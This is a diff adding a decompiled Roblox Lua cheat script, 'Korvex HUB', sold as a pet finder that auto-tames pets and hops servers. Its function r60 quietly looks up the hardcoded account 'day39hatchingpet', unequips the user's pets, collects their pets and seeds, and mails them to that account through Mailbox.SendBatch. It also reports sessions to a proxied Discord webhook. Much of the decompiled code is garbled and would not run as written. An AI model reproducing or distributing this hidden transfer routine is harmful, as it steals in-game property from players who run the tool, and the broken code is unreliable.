@@ -1,0 +1,671 @@
+local v2 = 18;
+local r24 = v2.GetService(18, "Players");
+local v4 = 19;
+local r25 = v4.GetService(19, "RunService");
+local v6 = 20;
+local r26 = v6.GetService(20, "ReplicatedStorage");
+local v7 = game;
+local r27 = game:GetService("HttpService");
+local v8 = game;
+local r28 = game:GetService("TeleportService");
+local v9 = game;
+local r29 = game:GetService("CoreGui");
+local v11 = 24;
+local r30 = v11.GetService(24, "UserInputService");
+local v13 = 25;
+local r31 = v13.GetService(25, "VirtualInputManager");
+local v15 = 26;
+local r32 = v15.GetService(26, "TweenService");
+local r33 = r24.LocalPlayer;
+local r34 = "day39hatchingpet";
+local r35 = os.date("%I:%M %p");
+local r36 = "KorvexHubConfig.json";
+local r37 = {
+    TargetPets = {
+        Frog = false,
+        Bunny = false,
+        Owl = false,
+        Bee = false,
+        Deer = false,
+        Robin = false,
+        Monkey = false,
+        Unicorn = true,
+        ["Golden Dragonfly"] = true,
+        Raccoon = true,
+        ["Black Dragon"] = false,
+        ["Ice Serpent"] = false
+    },
+    IsRunning = false,
+    WebhookURL = ""
+};
+local r38 = {
+    Unicorn = true,
+    ["Golden Dragonfly"] = true,
+    Raccoon = true,
+    ["Black Dragon"] = true,
+    ["Ice Serpent"] = true
+};
+local r41 = {};
+local function r42(...)
+    if writefile then
+        pcall(function(...)
+            local P = {
+                P[1],
+                P[2],
+                P[3]
+            };
+            writefile(r36, r27:JSONEncode(r37)); 
+        end);
+    end; 
+end;
+(function(...)
+    if readfile and isfile then
+        v2 = {
+            pcall(function(...)
+                local P = {
+                    P[2],
+                    P[1]
+                };
+                return r27:JSONDecode(readfile(r36)); 
+            end)
+        };
+        z = pcall(function(...)
+            local P = {
+                P[2],
+                P[1]
+            };
+            return r27:JSONDecode(readfile(r36)); 
+        end);
+        if z then
+            q = type(v2[2]) == "table";
+        end;
+        if z then
+            v6 = "-TN\xa4\x95\xee5\xf9\xe0o";
+            if v2[2].TargetPets then
+                v6 = "TargetPets";
+                for e, v7 in pairs("pairs") do
+                    V = r37.TargetPets;
+                    V[v6[3]] = v7; 
+                end;
+            end;
+            if v2[2].IsRunning ~= nil then
+                V = r37;
+                V.IsRunning = v2[2].IsRunning;
+            end;
+            if v2[2].WebhookURL ~= nil then
+                V = r37;
+                V.WebhookURL = v2[2].WebhookURL;
+            end;
+        end;
+    end; 
+end)();
+local function r43(arg1, ...)
+    v2 = r33.Character and r33.Character:FindFirstChild("HumanoidRootPart");
+    if not v2 then
+        return;
+    end;
+    v8 = r32:Create(v2, TweenInfo.new((v2.Position - arg1.Position).Magnitude / 65 and .1, Enum.EasingStyle.Linear), {
+        CFrame = arg1
+    });
+    v9 = Instance.new("BodyVelocity");
+    v9.Velocity = Vector3.new(0, 0, 0);
+    v9.MaxForce = Vector3.new(0, math.huge, 0);
+    v9.Parent = v2;
+    v8:Play();
+    q = "Completed";
+    q.Wait("Completed");
+    v9:Destroy(); 
+end;
+local function r47(...)
+    if not r37.WebhookURL or r37.WebhookURL == "" then
+        return;
+    end;
+    for e, v7 in pairs(q) do
+ 
+    end;
+    v6 = 83;
+    r45 = v6.gsub(83, "discord.com", "webhook.lewisakura.moe");
+    r46 = {
+        title = "\xf0\x9f\x9a\x80 Server Session Report",
+        color = tonumber("0x3498DB"),
+        fields = {
+            {
+                name = "Server JobId",
+                value = "`" .. game.JobId .. "`",
+                inline = false
+            },
+            {
+                name = "Time Joined",
+                value = r35,
+                inline = true
+            },
+            {
+                name = "Time Leaving",
+                value = os.date("%I:%M %p"),
+                inline = true
+            },
+            {
+                name = "Caught This Session",
+                value = "",
+                inline = false
+            }
+        },
+        footer = {
+            text = "Korvex HUB Engine"
+        }
+    };
+    if syn then
+    end;
+    if syn then
+    end; 
+end;
+local r48 = false;
+local function r51(...)
+    if r48 then
+        return;
+    end;
+    task.spawn(function(...)
+        local P = {
+            P[4],
+            P[2],
+            P[3],
+            P[5],
+            P[6],
+            P[7],
+            P[8],
+            P[1]
+        };
+        v4 = "\x81\x8e\xc9\xdd\x7f\xc2j\xaf\x83";
+        while r37.IsRunning do
+            e = "syn";
+            v4 = http;
+            if http then
+            end;
+            r49 = syn and syn.request or (http or (http_request or request));
+            if not (syn and syn.request or (http or (http_request or request))) then
+                return;
+            else
+                r50 = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100", game.PlaceId);
+                v4 = {
+                    pcall(function(...)
+                        local P = {
+                            90,
+                            P[2],
+                            P[3],
+                            12
+                        };
+                        return r49({
+                            Url = r50,
+                            Method = "GET"
+                        }); 
+                    end)
+                };
+                e = pcall(function(...)
+                    local P = {
+                        90,
+                        P[2],
+                        P[3],
+                        12
+                    };
+                    return r49({
+                        Url = r50,
+                        Method = "GET"
+                    }); 
+                end);
+                if e then
+                end;
+                if e then
+                    v11 = "!wx\xfb";
+                    v4 = r27:JSONDecode(v4[2].Body);
+                    if v4 then
+                    end;
+                    if v4 then
+                        v11 = "data";
+                        for v8, v13 in ipairs(v11[1]) do
+                            if type(v13) == "table" and true then
+                                if "playing" >= 1 and ("playing" <= 6 and "id" ~= game.JobId) then
+                                    table.insert(r27, "id");
+                                end;
+                            end; 
+                        end;
+                    end;
+                    if #{} > 0 then
+                        r47();
+                        task.wait(1.5);
+                        r28:TeleportToPlaceInstance(game.PlaceId, v6[math.random(1, #v6)], r33);
+                        task.wait(15);
+                        break;
+                    else
+                        task.wait(10);
+                    end;
+                end;
+            end; 
+        end; 
+    end); 
+end;
+local function r53(arg1, ...)
+    r52 = arg1;
+    e = {
+        pcall(function(...)
+            local P = {
+                P[1],
+                87
+            };
+            return r24:GetUserIdFromNameAsync(r52); 
+        end)
+    };
+    v2 = pcall(function(...)
+        local P = {
+            P[1],
+            87
+        };
+        return r24:GetUserIdFromNameAsync(r52); 
+    end);
+    if v2 then
+    end;
+    return v2 or nil; 
+end;
+local function r60(...)
+    r54 = r53(r34);
+    if not r54 then
+        return false;
+    end;
+    v4 = r26:WaitForChild("SharedModules");
+    v4 = {
+        pcall(require, v4:WaitForChild("Networking"))
+    };
+    v2 = pcall(require, v4:WaitForChild("Networking"));
+    r55 = v4[2];
+    v7 = r26[1];
+    for v6, v9 in ipairs(r26[1]:GetDescendants()) do
+        if v9:IsA("RemoteEvent") and v9.Name == "PetRequestUnequip" then
+        end; 
+    end;
+    if v2 then
+    end;
+    if v2 then
+        v9 = {
+            pcall(function(...)
+                local P = {
+                    88,
+                    P[4],
+                    P[5]
+                };
+                return r55.Pets.GetEquippedPets:Fire(); 
+            end)
+        };
+        v6 = pcall(function(...)
+            local P = {
+                88,
+                P[4],
+                P[5]
+            };
+            return r55.Pets.GetEquippedPets:Fire(); 
+        end);
+        if v6 then
+            v4 = type(v9[2]) == "table";
+        end;
+        if v6 then
+            for v11, v13 in (28760699171920)[1], pairs(v9[2]) do
+                if type(r57) == "table" and type(r57.Id) == "string" then
+                    pcall(function(...)
+                        local P = {
+                            88,
+                            P[4],
+                            P[5],
+                            52
+                        };
+                        r55.Pets.RequestUnequip:Fire(r57.Id); 
+                    end);
+                    if r56 then
+                        pcall(function(...)
+                            local P = {
+                                89,
+                                52,
+                                P[4],
+                                P[5]
+                            };
+                            r56:FireServer(r57.Id); 
+                        end);
+                    end;
+                    task.wait(.1);
+                end; 
+            end;
+            task.wait(1);
+        end;
+    end;
+    if r33.Character then
+        v6 = r33.Character:FindFirstChild("Humanoid");
+    end;
+    if r33.Character then
+        r33.Character.Humanoid:UnequipTools();
+        task.wait(0.5);
+    end;
+    v6 = {};
+    r58 = v6;
+    local function v6(arg1, ...)
+        local P = {
+            P[4],
+            P[5],
+            P[7],
+            13,
+            P[8]
+        };
+        if not arg1 then
+            return;
+        end;
+        e = {
+            arg1:GetChildren()
+        };
+        for v2, v6 in arg1.GetChildren[1], ipairs(D(arg1.GetChildren[1])) do
+            if v6:IsA("Tool") then
+                v7 = v6:GetAttribute("Count") or 1;
+                v8 = v6:GetAttribute("SeedTool");
+                v11 = v6:IsA(v7);
+                if v8 then
+                end;
+                if v9 then
+                    table.insert(r58, {
+                        Category = "Seeds",
+                        ItemKey = v8,
+                        Count = v6:GetAttribute("Count") or 1,
+                        DisplayName = v8 .. " Seed"
+                    });
+                else
+                    v9 = v6:GetAttribute("PetId");
+                    v11 = v6:GetAttribute("Pet");
+                    v13 = v6:GetAttribute("PetSize");
+                    if v11 then
+                        v17 = type(v9) == "string" and not v9:find("Visual_");
+                    end;
+                    if v11 then
+                        v16 = v13 == "Huge" or (v13 == "Big" or v6:GetAttribute("PetType") == "Rainbow");
+                        V = v13 == "Huge" or (v13 == "Big" or v6:GetAttribute("PetType") == "Rainbow");
+                        if v13 == "Huge" or (v13 == "Big" or v6:GetAttribute("PetType") == "Rainbow") then
+                        else
+                            M = ({
+                                BlackDragon = "Black Dragon",
+                                IceSerpent = "Ice Serpent",
+                                GoldenDragonfly = "Golden Dragonfly",
+                                Unicorn = "Unicorn",
+                                Raccoon = "Raccoon"
+                            })[v6:GetAttribute("Pet")];
+                            if M then
+                                if r38[d] then
+                                end;
+                            else
+                                v6:GetAttribute("Pet");
+                            end;
+                        end;
+                    end;
+                end;
+            end; 
+        end; 
+    end;
+    v6(r33:FindFirstChild("Backpack"));
+    v6(r33.Character);
+    if #v6 == 0 then
+        return false;
+    end;
+    v8 = {};
+    v9 = {};
+    for v17, s in ("\x7fE\xd2\xe55\x1e\xf8\x02\xcb")[1], ipairs(v6) do
+        if #v9 >= 20 then
+            table.insert({}, {});
+        end;
+        table.insert(v9, {
+            Category = "Category",
+            ItemKey = "ItemKey",
+            Count = "Count"
+        }); 
+    end;
+    if #v9 > 0 then
+        table.insert(v8, v9);
+    end;
+    if v2 then
+    end;
+    if v2 then
+        d = 26973313265936;
+        v13 = workspace:FindFirstChild("Mailbox", true);
+        if not v13 then
+            for s, d in ipairs(workspace:GetDescendants()) do
+                h = workspace.Name:match("Mailbox");
+                if h then
+                    u = workspace:IsA("Model") or workspace:IsA("BasePart");
+                end;
+                if h then
+                end; 
+            end;
+        end;
+        if v13 then
+            r43(v13:GetPivot() * CFrame.new(0, 3, 0));
+            task.wait(1.5);
+        end;
+        for s, d in ipairs(v8) do
+            r59 = 26973313265936;
+            pcall(function(...)
+                local P = {
+                    88,
+                    P[4],
+                    P[5],
+                    85,
+                    54
+                };
+                return r55.Mailbox.SendBatch:Fire(r54, r59, "Meta Auto Transfer"); 
+            end);
+            if d[3] < #{} then
+                task.wait(3.5);
+            end; 
+        end;
+    end;
+    return true; 
+end;
+local function r71(arg1, ...)
+    r69 = arg1;
+    r43(arg1:GetPivot() * CFrame.new(0, 3, 0));
+    task.wait(0.5);
+    v4 = game:GetService("ReplicatedStorage");
+    e = v4:WaitForChild("SharedModules");
+    e = {
+        pcall(require, e:WaitForChild("Networking"))
+    };
+    e = 74;
+    r70 = e[2];
+    for a = 1, 20 do
+        if arg1:GetAttribute("OwnerUserId") == r33.UserId then
+        else
+            if e[1] then
+            end;
+            if e[1] then
+                pcall(function(...)
+                    local P = {
+                        74,
+                        P[2],
+                        P[3],
+                        73
+                    };
+                    r70.Pets.WildPetTame:Fire(r69); 
+                end);
+            end;
+            v11 = arg1:FindFirstChildWhichIsA("ProximityPrompt", true);
+            if v11 then
+            end;
+            if v11 then
+                fireproximityprompt(v11);
+            end;
+            task.wait(0.25);
+        end; 
+    end;
+    return false; 
+end;
+local function r72(...)
+    if not r37.IsRunning then
+        return;
+    end;
+    while r37.IsRunning do
+        Z = workspace:FindFirstChild("Map") and workspace:FindFirstChild("WildPetRef");
+        if Z then
+            V = ipairs;
+            v4 = {
+                Z:GetChildren()
+            };
+            for e, v7 in ipairs(D("ipairs")) do
+                V = v7:GetAttribute("OwnerUserId");
+                v15 = not V;
+                v11 = not V;
+                if not V then
+                    v9 = not V and not r41[v7];
+                    if not V and not r41[v7] then
+                        v9 = v7:GetAttribute("Pet");
+                        v11 = v7:GetAttribute("PetSize");
+                        v15 = v7:GetAttribute("PetName") or v7.Name;
+                        if v11 == "Huge" or (v11 == "Big" or v7:GetAttribute("PetType") == "Rainbow") then
+                        else
+                            h = 26496346763314;
+                            if v15:find("Huge") or (v15:find("Big") or v15:find("Rainbow")) then
+                            else
+                                h = r37;
+                                for M, f in pairs(r37.TargetPets) do
+                                    if r37.TargetPets then
+                                        h = M:lower();
+                                        O = h:gsub("%s+", "");
+                                        h = v15:lower();
+                                        L = h:gsub("%s+", "");
+                                        h = v9;
+                                        if v9 then
+                                            B = v9:lower();
+                                            h = B:gsub("%s+", "");
+                                            if L:find(O) or h:find(O) then
+                                            end;
+                                        end;
+                                    end; 
+                                end;
+                            end;
+                        end;
+                    end;
+                end; 
+            end;
+        end;
+        if z then
+            if not r71(V) then
+                v2 = r41;
+                v2[V] = true;
+            end;
+            task.wait(1);
+        end;
+        if r37.IsRunning then
+            r42();
+            r51();
+            break;
+        end;
+        return; 
+    end; 
+end;
+local function r73(...)
+    if not r37.IsRunning then
+        return;
+    end;
+    r60();
+    r72(); 
+end;
+local function r80(arg1, arg2, ...)
+    r74 = arg2;
+    arg1.InputBegan:Connect(function(arg1, ...)
+        local P = {
+            P[1],
+            P[2],
+            7,
+            9,
+            8,
+            11
+        };
+        r79 = arg1;
+        if arg1.UserInputType == Enum.UserInputType.MouseButton1 or arg1.UserInputType == Enum.UserInputType.Touch then
+            arg1.Changed:Connect(function(...)
+                local P = {
+                    53,
+                    P[1],
+                    P[2],
+                    7
+                };
+                if r79.UserInputState == Enum.UserInputState.End then
+                end; 
+            end);
+        end; 
+    end);
+    arg1.InputChanged:Connect(function(arg1, ...)
+        local P = {
+            P[1],
+            P[2],
+            10
+        };
+        if arg1.UserInputType == Enum.UserInputType.MouseMovement or arg1.UserInputType == Enum.UserInputType.Touch then
+        end; 
+    end);
+    V = r30.InputChanged;
+    r30.InputChanged:Connect(function(arg1, ...)
+        local P = {
+            10,
+            7,
+            P[1],
+            P[2],
+            9,
+            8,
+            11
+        };
+        if arg1 == r76 and r75 then
+            V = r74;
+            V.Position = UDim2.new(r78.v6.Scale, r78.v6.Offset + P.X, r78.Y.Scale, r78.Y.Offset + P.Y);
+        end; 
+    end); 
+end;
+(function(...)
+    z = r29:FindFirstChild("RobloxGui");
+    if z then
+        V = v15[1]:FindFirstChild("PetFinderUI");
+        if V then
+            v15[1].PetFinderUI:Destroy();
+        end;
+        z = Instance.new("ScreenGui");
+        v2 = Instance.new("Frame");
+        v2.Size = UDim2.new(0, 210, 0, 380);
+        v2.Position = UDim2.new(0.5, -105, 0.5, -190);
+        v2.BackgroundColor3 = Color3.fromRGB(24, 24, 26);
+        v2.BorderColor3 = Color3.fromRGB(50, 50, 55);
+        v2.BorderSizePixel = 1;
+        v2.Active = true;
+        e = Instance.new("TextLabel");
+        e.Size = UDim2.new(1, 0, 0, 30);
+        e.BackgroundColor3 = Color3.fromRGB(35, 35, 40);
+        e.BorderColor3 = Color3.fromRGB(50, 50, 55);
+        e.BorderSizePixel = 1;
+        e.Text = "Korvex HUB";
+        e.TextColor3 = Color3.fromRGB(220, 220, 230);
+        e.Font = Enum.Font.SourceSansBold;
+        e.TextSize = 14;
+        e.Active = true;
+        e.Parent = v2;
+        r80(e, v2);
+        r81 = Instance.new("TextLabel");
+        V = r81;
+        V.Size = UDim2.new(1, -10, 0, 20);
+        V = r81;
+        V.Position = UDim2.new(0, 5, 0, 35);
+        V = r81;
+        V.BackgroundTransparency = 1;
+        V = r81;
+        V.TextColor3 = Color3.fromRGB(180, 180, 190);
+        V = r81;
+        V.Font = Enum.Font.SourceSans;
+        V = r81;
+        V.TextSize = 13;
+        V = r81;
+        V.TextXAlignment = Enum.TextXAlignment.Left;
+        V = r81;
+        V.Parent = v2;
+        v6 = 3;
+        local function r82(...)
+            local P = {
+                P[5],
+                P[2],
+             
